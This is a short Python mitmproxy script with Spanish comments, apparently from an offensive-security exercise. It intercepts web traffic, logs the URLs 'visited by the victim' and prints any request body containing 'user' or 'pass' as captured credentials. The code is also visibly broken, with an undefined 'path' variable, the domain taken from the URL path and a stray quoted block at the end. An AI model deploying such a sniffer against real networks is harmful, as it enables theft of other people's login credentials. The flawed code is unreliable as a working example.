#!/usr/bin/env python3

# Revisar la clase de rastreador de consultas HTTPS para profundizar.

from mitmproxy import http
from urllib.parse import urlparse
#from mitmproxy import ctx

def has_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)

def request(packet):
    #ctx.log.info(f"\n\n[+] URL: {packet.request.url}")
    
    url = packet.request.url
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme
    domain = parsed_url.path
    
    print(f"[+] URL visitada por la victima: {scheme}://{domain}{path}")
    
    keywords = ["user", "pass"]
    data = packet.request.get_text()
    
    if has_keywords(data, keywords):
        print(f"\n[+] Posibles credenciales capturadas:\n\n{data}\n")
 
 """   
def response(packet):
    #ctx.log.info(f"\n\n[+] Response: {packet.request.url}")
"""